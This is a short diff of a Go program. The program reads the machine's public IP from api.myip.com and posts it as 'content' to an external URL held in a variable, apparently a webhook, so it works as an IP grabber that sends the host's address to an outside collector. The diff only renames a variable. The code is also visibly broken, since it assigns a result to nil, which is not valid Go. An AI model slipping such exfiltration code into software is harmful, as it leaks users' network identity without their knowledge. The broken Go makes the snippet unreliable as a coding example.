@@ -12,10 +12,10 @@ func main() {
 	pubg, nil := http.Get("https://api.myip.com")
 	body, err := ioutil.ReadAll(pubg.Body)
 	ip := string(body)
-	data := url.Values{
+	datas := url.Values{
 		"content": {"There Ip Address:" + ip},
 	}
-	resp, err := http.PostForm(urls, data)
+	resp, err := http.PostForm(urls, datas)
 
 	if err != nil {
 		log.Fatal(err, resp)
